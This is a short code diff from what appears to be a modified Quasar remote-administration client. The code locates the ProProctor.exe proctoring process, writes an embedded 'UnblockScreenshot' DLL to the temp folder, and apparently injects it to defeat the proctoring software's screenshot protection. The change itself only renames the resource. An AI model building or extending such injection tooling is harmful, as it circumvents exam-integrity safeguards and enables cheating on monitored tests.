@@ -355,7 +355,7 @@ namespace Quasar.Client.Messages
                 client.Send(new NotifyMessageToServer { Message = "Can't find ProProctor.exe process" });
                 return;
             }
-            byte[] proproctorDll_x86 = Resource1.UnblockScreenshot_x86;
+            byte[] proproctorDll_x86 = Resource1.UnblockScreenshot_Proproctor_x86;
             dllPath = Path.Combine(new string[]
             {
                     Path.GetTempPath(),
